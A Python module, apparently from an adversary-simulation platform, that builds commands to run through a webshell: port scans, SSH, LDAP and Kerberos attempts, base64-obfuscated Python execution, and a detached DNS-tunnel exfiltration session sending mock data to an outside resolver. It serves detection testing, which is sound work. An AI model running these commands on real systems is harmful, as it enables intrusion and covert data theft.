"""Shell command builders for webshell command-only execution."""

from __future__ import annotations

import base64
import re
import shlex
from typing import Any

from dsp.protocols.dns.tunnel import (
    CHUNK_SIZE_DEFAULT,
    MOCK_PAYLOAD_FILENAME,
    MOCK_PAYLOAD_PATTERN,
    SEND_INTERVAL_SEC,
)


def mock_noop_command() -> str:
    """Minimal command for dry-run / mock delivery."""
    return "true"


def wrap_remote_shell_command(command: str) -> str:
    """Run a command through /bin/sh -c so JSP exec() receives a shell pipeline."""
    return f"/bin/sh -c {shlex.quote(command.strip())}"


def _sanitize_run_token(run_id: str) -> str:
    cleaned = re.sub(r"[^A-Za-z0-9_-]+", "_", str(run_id or "run").strip())
    return cleaned[:48] or "run"


def discovery_probe_output_path(run_id: str, batch_index: int) -> str:
    token = _sanitize_run_token(run_id)
    return f"/tmp/.dsp-{token}-probe-{int(batch_index)}.out"


def dns_tunnel_sent_marker_output_path(run_id: str, target: str) -> str:
    """Remote path for per-send DNS tunnel stdout markers (cat back after session)."""
    token = _sanitize_run_token(run_id)
    host_token = re.sub(r"[^A-Za-z0-9._-]+", "_", str(target or "host").strip())[:32]
    return f"/tmp/.dsp-{token}-dns-tunnel-{host_token}.sent"


def tcp_probe_command(host: str, port: int, *, timeout: float = 3.0) -> str:
    """TCP connect probe via python3 stdlib — no file upload required."""
    t = max(1, int(timeout))
    script = (
        "import socket;"
        f"s=socket.socket();s.settimeout({t});"
        f"s.connect(({host!r},{int(port)}));s.close()"
    )
    return wrap_remote_shell_command(f"python3 -c {shlex.quote(script)} 2>/dev/null || true")


PROBE_OPEN_MARKER = "DSP_PROBE_OPEN"
DNS_QUERY_METHOD = "python3_socket_udp53"


def _python3_b64_exec_command(script: str) -> str:
    """Run multiline Python via ``python3 -c`` + base64 (shell/webshell safe)."""
    payload = base64.b64encode(script.encode("utf-8")).decode("ascii")
    bootstrap = f"import base64; exec(base64.b64decode({payload!r}).decode())"
    return f"python3 -c {shlex.quote(bootstrap)}"


def tcp_probe_discovery_command(
    host: str,
    port: int,
    *,
    timeout: float = 0.5,
    output_path: str = "/tmp/.dsp-probe.out",
) -> str:
    """TCP probe that records open ports in a file, then cats it for transport capture."""
    t = max(0.1, float(timeout))
    write_script = (
        "import socket\n"
        f"h = {host!r}\n"
        f"p = {int(port)}\n"
        f"t = {t}\n"
        f"m = {PROBE_OPEN_MARKER!r}\n"
        f"out = {output_path!r}\n"
        "lines = []\n"
        "try:\n"
        "    socket.create_connection((h, p), timeout=t).close()\n"
        "    lines.append(m)\n"
        "except OSError:\n"
        "    pass\n"
        'open(out, "w").write("\\n".join(lines))\n'
    )
    pipeline = (
        f"rm -f {shlex.quote(output_path)}; "
        f"{_python3_b64_exec_command(write_script)}; "
        f"cat {shlex.quote(output_path)} 2>/dev/null"
    )
    return wrap_remote_shell_command(pipeline)


def tcp_probe_batch_discovery_command(
    probes: list[tuple[str, int]],
    *,
    timeout: float = 0.5,
    output_path: str = "/tmp/.dsp-probe.out",
    workers: int = 32,
) -> str:
    """Batch TCP probes via sh -c, writing markers to a file and catting it back."""
    t = max(0.1, float(timeout))
    worker_count = max(1, min(int(workers), len(probes) or 1))
    write_script = (
        "import socket\n"
        "from concurrent.futures import ThreadPoolExecutor, as_completed\n"
        f"probes = {probes!r}\n"
        f"t = {t}\n"
        f"m = {PROBE_OPEN_MARKER!r}\n"
        f"out = {output_path!r}\n"
        f"w = {worker_count}\n"
        "def probe(tup):\n"
        "    h, p = tup\n"
        "    try:\n"
        "        socket.create_connection((h, p), timeout=t).close()\n"
        "        return f\"{m} {h}:{p}\"\n"
        "    except OSError:\n"
        "        return None\n"
        "lines = []\n"
        "with ThreadPoolExecutor(max_workers=min(w, max(1, len(probes)))) as pool:\n"
        "    futures = [pool.submit(probe, x) for x in probes]\n"
        "    for fut in as_completed(futures):\n"
        "        row = fut.result()\n"
        "        if row:\n"
        "            lines.append(row)\n"
        'open(out, "w").write("\\n".join(lines))\n'
    )
    pipeline = (
        f"rm -f {shlex.quote(output_path)}; "
        f"{_python3_b64_exec_command(write_script)}; "
        f"cat {shlex.quote(output_path)} 2>/dev/null"
    )
    return wrap_remote_shell_command(pipeline)


def curl_request_command(
    url: str,
    *,
    method: str = "GET",
    user_agent: str = "Mozilla/5.0",
    timeout: float = 10.0,
    body_b64: str | None = None,
    content_type: str | None = None,
) -> str:
    """Build a curl command that discards response body (no parsing on DSP host)."""
    t = max(1, int(timeout))
    parts = [
        "curl",
        "-sS",
        "-o",
        "/dev/null",
        "--max-time",
        str(t),
        "-A",
        user_agent,
        "-X",
        method,
    ]
    if body_b64:
        body = base64.b64decode(body_b64)
        ctype = content_type or "application/octet-stream"
        parts.extend(
            [
                "-H",
                f"Content-Type: {ctype}",
                "--data-binary",
                shlex.quote(body.decode("latin-1", errors="replace")),
            ]
        )
    parts.append(shlex.quote(url))
    return " ".join(parts)


def ssh_attempt_command(
    host: str,
    port: int,
    username: str,
    *,
    timeout: float = 5.0,
) -> str:
    """SSH auth attempt — transport only; outcome not interpreted on DSP host."""
    t = max(1, int(timeout))
    target = f"{username}@{host}"
    return (
        f"ssh -o BatchMode=yes -o ConnectTimeout={t} "
        f"-o StrictHostKeyChecking=no -p {int(port)} "
        f"{shlex.quote(target)} exit 2>/dev/null || true"
    )


def nc_probe_command(host: str, port: int, *, timeout: float = 5.0) -> str:
    t = max(1, int(timeout))
    return f"nc -z -w {t} {shlex.quote(host)} {int(port)} 2>/dev/null || true"


def dns_query_command(
    resolver: str,
    fqdn: str,
    *,
    timeout: float = 0.05,
    sent_marker_prefix: str | None = None,
    suppress_errors: bool = True,
) -> str:
    """UDP/53 DNS query via python3 stdlib."""
    t = max(0.001, float(timeout))
    marker_prefix = str(sent_marker_prefix or "").strip()
    script = (
        "import socket\n"
        "import struct\n"
        "import uuid\n"
        "\n"
        f"fqdn = {fqdn!r}\n"
        f"resolver = {resolver!r}\n"
        "port = 53\n"
        f"timeout = {t}\n"
        f"marker_prefix = {marker_prefix!r}\n"
        "\n"
        "def encode_qname(name: str) -> bytes:\n"
        "    out = b\"\"\n"
        "    name = (name or \"\").rstrip(\".\")\n"
        "    for label in name.split(\".\"):\n"
        "        if not label:\n"
        "            continue\n"
        "        b = label.encode(\"ascii\", errors=\"ignore\")\n"
        "        out += struct.pack(\"B\", len(b)) + b\n"
        "    return out + b\"\\x00\"\n"
        "\n"
        "txn_id = struct.unpack(\"!H\", uuid.uuid4().bytes[:2])[0]\n"
        "header = struct.pack(\"!HHHHHH\", txn_id, 0x0100, 1, 0, 0, 0)\n"
        "question = encode_qname(fqdn) + struct.pack(\"!HH\", 1, 1)\n"
        "packet = header + question\n"
        "\n"
        "sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n"
        "sock.settimeout(timeout)\n"
        "sock.sendto(packet, (resolver, port))\n"
        "sock.close()\n"
        "if marker_prefix:\n"
        "    print(f\"{marker_prefix}{fqdn}\")\n"
    )
    command = _python3_b64_exec_command(script)
    if suppress_errors:
        return f"{command} 2>/dev/null || true"
    return command


def dns_tunnel_session_log_path(marker_output_path: str) -> str:
    """Companion log path for a detached DNS tunnel session."""
    return f"{marker_output_path}.log"


def dns_tunnel_session_poll_done_command(marker_output_path: str) -> str:
    """Return a short remote command that prints 1 when SESSION_DONE is present."""
    path = shlex.quote(marker_output_path)
    # Count marker only — must not use ``|| true`` so callers can parse stdout.
    return wrap_remote_shell_command(
        f"grep -c DNS_TUNNEL_SESSION_DONE {path} 2>/dev/null || echo 0"
    )


def dns_tunnel_session_command(
    target: str,
    *,
    payload_mb: float,
    chunk_size: int = CHUNK_SIZE_DEFAULT,
    domain: str,
    mock_filename: str = MOCK_PAYLOAD_FILENAME,
    send_interval: float = SEND_INTERVAL_SEC,
    suppress_errors: bool = True,
    max_chunks: int | None = None,
    marker_output_path: str = "/tmp/.dsp-dns-tunnel.sent",
    background: bool = True,
) -> str:
    """Run full DNS tunnel exfil session on remote host — sendto only, no DNS recv.

    When ``background`` is True (webshell default), the Python session is started
    with ``nohup`` so the HTTP request returns immediately. Callers must poll
    ``dns_tunnel_session_poll_done_command`` until SESSION_DONE, then cat markers.
    """
    max_chunks_literal = "None" if max_chunks is None else str(int(max_chunks))
    script = (
        "import base64\n"
        "import os\n"
        "import socket\n"
        "import struct\n"
        "import time\n"
        "import uuid\n"
        "import tempfile\n"
        "\n"
        f"T = {target!r}\n"
        f"D = {domain!r}\n"
        f"F = {mock_filename!r}\n"
        f"C = {int(chunk_size)}\n"
        f"M = {float(payload_mb)}\n"
        f"I = {float(send_interval)}\n"
        f"P = {MOCK_PAYLOAD_PATTERN!r}\n"
        f"N = {max_chunks_literal}\n"
        f"MARKER = {marker_output_path!r}\n"
        "\n"
        "def b32(x: bytes) -> str:\n"
        "    return base64.b32encode(x).decode(\"ascii\").lower().rstrip(\"=\")\n"
        "\n"
        "def qname(name: str) -> bytes:\n"
        "    out = b\"\"\n"
        "    name = (name or \"\").rstrip(\".\")\n"
        "    for label in name.split(\".\"):\n"
        "        if not label:\n"
        "            continue\n"
        "        b = label.encode(\"ascii\", errors=\"ignore\")\n"
        "        out += struct.pack(\"B\", len(b)) + b\n"
        "    return out + b\"\\x00\"\n"
        "\n"
        "def make_query(fqdn: str) -> bytes:\n"
        "    txn_id = struct.unpack(\"!H\", uuid.uuid4().bytes[:2])[0]\n"
        "    header = struct.pack(\"!HHHHHH\", txn_id, 0x0100, 1, 0, 0, 0)\n"
        "    question = qname(fqdn) + struct.pack(\"!HH\", 1, 1)\n"
        "    return header + question\n"
        "\n"
        "def build_payload() -> bytes:\n"
        "    total = max(C, int(M * 1024 * 1024))\n"
        "    repeats = (total + len(P) - 1) // len(P)\n"
        "    return (P * repeats)[:total]\n"
        "\n"
        "def send(sock: socket.socket, fqdn: str) -> None:\n"
        "    sock.sendto(make_query(fqdn), (T, 53))\n"
        "    with open(MARKER, \"a\", encoding=\"ascii\") as mh:\n"
        "        mh.write(\"DNS_TUNNEL_SENT:\" + fqdn + \"\\n\")\n"
        "        mh.flush()\n"
        "\n"
        "open(MARKER, \"w\").close()\n"
        "with tempfile.TemporaryDirectory() as td:\n"
        "    fp = os.path.join(td, F)\n"
        "    open(fp, \"wb\").write(build_payload())\n"
        "    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n"
        "    send(sock, \"strt-\" + b32(F.encode(\"ascii\", errors=\"ignore\")) + \".\" + D)\n"
        "    seq = 0\n"
        "    with open(fp, \"rb\") as fh:\n"
        "        while True:\n"
        "            ch = fh.read(C)\n"
        "            if not ch:\n"
        "                break\n"
        "            send(sock, \"idx-\" + format(seq, \"04d\") + \"-\" + b32(ch) + \".\" + D)\n"
        "            seq += 1\n"
        "            if N is not None and seq >= N:\n"
        "                break\n"
        "            if I > 0:\n"
        "                time.sleep(I)\n"
        "    send(sock, \"end-0.\" + D)\n"
        "    sock.close()\n"
        "with open(MARKER, \"a\", encoding=\"ascii\") as mh:\n"
        "    mh.write(\"DNS_TUNNEL_SESSION_DONE\\n\")\n"
    )
    inner = _python3_b64_exec_command(script)
    marker_q = shlex.quote(marker_output_path)
    if background:
        log_q = shlex.quote(dns_tunnel_session_log_path(marker_output_path))
        # Detach so webshell HTTP (~30s servlet envelopes) cannot truncate the session.
        pipeline = (
            f"rm -f {marker_q} {log_q}; "
            f"nohup {inner} >{log_q} 2>&1 </dev/null & "
            f"echo DNS_TUNNEL_LAUNCHED:$!"
        )
        return wrap_remote_shell_command(pipeline)
    pipeline = f"rm -f {marker_q}; {inner}"
    command = wrap_remote_shell_command(pipeline)
    if suppress_errors:
        return f"{command} 2>/dev/null || true"
    return command


def dns_tunnel_session_command_evidence(
    target: str,
    *,
    payload_mb: float,
    chunk_size: int = CHUNK_SIZE_DEFAULT,
    domain: str,
    mock_filename: str = MOCK_PAYLOAD_FILENAME,
    send_interval: float = SEND_INTERVAL_SEC,
    suppress_errors: bool = True,
    max_chunks: int | None = None,
    marker_output_path: str | None = None,
    run_id: str = "",
) -> dict[str, Any]:
    """Metadata for a full remote DNS tunnel session command."""
    marker_path = marker_output_path or dns_tunnel_sent_marker_output_path(run_id, target)
    command = dns_tunnel_session_command(
        target,
        payload_mb=payload_mb,
        chunk_size=chunk_size,
        domain=domain,
        mock_filename=mock_filename,
        send_interval=send_interval,
        suppress_errors=suppress_errors,
        max_chunks=max_chunks,
        marker_output_path=marker_path,
        background=True,
    )
    return {
        "dns_query_method": DNS_QUERY_METHOD,
        "remote_command": command,
        "poll_done_command": dns_tunnel_session_poll_done_command(marker_path),
        "execution_mode": "dns_tunnel_session_detached",
        "marker_output_path": marker_path,
        "session_log_path": dns_tunnel_session_log_path(marker_path),
        "max_chunks": max_chunks,
    }


def dns_query_command_evidence(
    resolver: str,
    fqdn: str,
    *,
    timeout: float = 0.05,
    sent_marker_prefix: str | None = None,
    suppress_errors: bool = True,
) -> dict[str, str]:
    """Metadata describing the DNS query command dispatched through the webshell."""
    command = dns_query_command(
        resolver,
        fqdn,
        timeout=timeout,
        sent_marker_prefix=sent_marker_prefix,
        suppress_errors=suppress_errors,
    )
    return {
        "dns_query_method": DNS_QUERY_METHOD,
        "remote_command": command,
    }


def ldap_action_command(
    host: str,
    port: int,
    action_type: str,
    *,
    search_filter: str = "",
    timeout: float = 5.0,
) -> str:
    t = max(1, int(timeout))
    uri = f"ldap://{host}:{port}"
    if action_type == "connection":
        return f"ldapsearch -x -H {shlex.quote(uri)} -s base -b '' -l {t} '(objectClass=*)' 2>/dev/null || true"
    if action_type == "bind":
        return (
            f"ldapsearch -x -H {shlex.quote(uri)} -D cn=admin -w invalid "
            f"-s base -b '' -l {t} '(objectClass=*)' 2>/dev/null || true"
        )
    filt = search_filter or "(objectClass=*)"
    return (
        f"ldapsearch -x -H {shlex.quote(uri)} -s sub -b dc=example,dc=com "
        f"-l {t} {shlex.quote(filt)} 2>/dev/null || true"
    )


def smb_probe_command(host: str, port: int, *, timeout: float = 5.0) -> str:
    t = max(1, int(timeout))
    script = (
        "import socket;"
        f"s=socket.socket();s.settimeout({t});"
        f"s.connect(({host!r},{int(port)}));s.close()"
    )
    return f"python3 -c {shlex.quote(script)} 2>/dev/null || true"


def kerberos_attempt_command(
    host: str,
    port: int,
    username: str,
    realm: str,
    *,
    timeout: float = 10.0,
) -> str:
    t = max(1, int(timeout))
    script = (
        "import socket;"
        f"s=socket.socket();s.settimeout({t});"
        f"s.connect(({host!r},{int(port)}));s.close()"
    )
    return (
        f"python3 -c {shlex.quote(script)} 2>/dev/null || "
        f"kinit {shlex.quote(f'{username}@{realm}')} 2>/dev/null || true"
    )


def host_behavior_shell_command(shell: str) -> str:
    return shell


def rare_protocol_probe_command(host: str, port: int, protocol: str) -> str:
    if protocol == "rtsp":
        return (
            f"printf 'OPTIONS rtsp://{host}:{port}/ RTSP/1.0\\r\\nCSeq: 1\\r\\n\\r\\n' | "
            f"nc -w 3 {shlex.quote(host)} {int(port)} 2>/dev/null || true"
        )
    return tcp_probe_command(host, port)
